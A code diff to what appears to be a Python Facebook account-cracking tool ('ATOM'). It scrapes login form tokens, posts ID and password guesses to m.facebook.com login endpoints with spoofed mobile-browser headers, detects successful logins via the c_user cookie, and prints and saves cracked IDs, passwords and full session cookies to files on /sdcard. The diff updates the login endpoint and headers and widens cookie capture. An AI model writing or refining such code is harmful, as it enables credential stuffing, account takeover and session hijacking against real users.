@@ -1012,44 +1012,35 @@ def m2(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    free_fb = session.get(f'https://m.facebook.com/?locale2=en_GB').text
-   log_data ={
-   "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
-   "login":"Log In"}
-   header_freefb ={
-    'authority': 'm.facebook.com',
-    'accept': '*/*',
-    'accept-language': 'es-MX,es;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'dpr': '2.75',
-    'origin': 'https://m.facebook.com',
-    'referer': 'https://m.facebook.com/?locale2=en_GB',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Chromium";v="120", "Google Chrome";v="118", ";Not A Brand";v="8.0.0.0"',
-    'sec-ch-ua-full-version-list': '"Not A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"23128PC33I"',
-    'sec-ch-ua-platform': 'Android',
-    'sec-ch-ua-platform-version': '"8.0.0"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
-    'viewport-width': '393',
-    'x-asbd-id': '129477',
-    'x-fb-lsd': 'AVq9MsDYu_k',
-    'x-requested-with': 'XMLHttpRequest',
-    'x-response-format': 'JSONStream'} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=log_data,headers=header_freefb).text
+   log_data ={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":idf,"pass":ps,"login":"Log In"}
+   header_freefb ={'Host': 'm.facebook.com',
+   'Connection': 'keep-alive',
+   'Content-Length': '2059',
+   'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+   'sec-ch-ua-model': '"SM-S928B"',
+   'sec-ch-ua-mobile': '?1',
+   'User-Agent': ua5,
+   'viewport-width': '400',
+   'Content-Type': 'application/x-www-form-urlencoded',
+   'X-FB-LSD': 'AVovWh_3iKg',
+   'sec-ch-ua-platform-version': '"14.0.0"',
+   'X-ASBD-ID': '129477',
+   'dpr': '1.8',
+   'sec-ch-ua-full-version-list': '"Google Chrome";v="105.0.5195.136", "Not)A;Brand";v="8.0.0.0", "Chromium";v="105.0.5195.136"',
+   'sec-ch-prefers-color-scheme': 'dark',
+   'sec-ch-ua-platform': '"Android"',
+   'Accept': '*/*',
+   'Origin': 'https://m.facebook.com',
+   'Sec-Fetch-Site': 'same-origin',
+   'Sec-Fetch-Mode': 'cors',
+   'Sec-Fetch-Dest': 'empty',
+   'Referer': 'https://m.facebook.com/',
+   'Accept-Encoding': 'gzip, deflate, br',
+   'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',} #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
+   lo = session.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
-    coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
+    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f'https://graph.facebook.com/{user}/picture?type=normal'
     reqx = requests.get(url).text
@@ -1361,7 +1352,7 @@ def m6(idf,pwv):
     if 'lock' in reqx:
             print(f'\r\r{p}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki}\33[1;36m")
-            open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
+            open('/sdcard/ATOM-M6-death-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             ok+=1 
             break
    elif 'checkpoint' in log_cookies:
